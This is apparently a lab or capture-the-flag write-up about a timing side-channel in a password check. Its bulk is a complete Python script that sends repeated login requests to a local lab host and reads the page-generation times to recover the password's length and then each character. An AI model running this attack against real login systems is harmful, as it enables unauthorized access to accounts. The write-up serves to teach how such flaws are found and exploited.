# Passsword Timing Attack

The bottom of the page says how long it takes to load the page. This can be used in a timing attack to get the password.
There is also a link at the bottom of the page the lets you see the source code. 
In the source code, we can see that it will validate the password character by character. If it finds a valid character, it sleeps for 0.15 seconds.
This allows us to write a script that can loop over every character and the one that takes the longest is likely to be the right one.

Here is an example solution in python:

	import httplib, urllib, string

	def get_time(response_data):
		"""Parses the time from the response"""
		start_index = response_data.find("Page generated in ") + 18
		end_index = response_data.find(" ms.")
		value = response_data[start_index: end_index]
		return int(value)

	def time_login(password):
		"""Returns the time it takes to perform the login"""
		host = "192.168.33.10"
		url = "/password/brute-force/index.php"
		
		params = urllib.urlencode({"your_password": password})
		headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html"}
		con = httplib.HTTPConnection(host)
		con.request("POST", url, params, headers)
		response = con.getresponse()
		response_data = response.read()
		con.close()
		return get_time(response_data)

	def get_length():
		"""Cracks the password length based on which one takes the longest"""
		longest_time = 0
		found_length = None
		
		for length in range(5, 10):
			# It only takes longer if it finds a correct character.
			# So this will loop through every character as the first character for every length we are testing.
			for letter in string.ascii_lowercase:
				password = letter + "x" * (length-1)
				timespan = time_login(password)
				print password, timespan
				# This could be optimized by returning when one is signiticantly larger instead of exhausting all possible solultions.
				if (timespan > longest_time):
					longest_time = timespan
					found_length = length

		print found_length
		return found_length

	def get_password():
		length = get_length()
		found_password = ""
		
		for index in range(0, length):
			longest_time = 0
			max_letter = None
			
			for letter in string.ascii_lowercase:
				password_attempt = found_password + letter + "x" * (length-index-1)
				timespan = time_login(password_attempt)
				print password_attempt, timespan
				# This could be optimized by returning when one is signiticantly larger instead of exhausting all possible solutions.
				if (timespan > longest_time):
					longest_time = timespan
					max_letter = letter
			
			found_password += max_letter
			print found_password
		return found_password

	print get_password()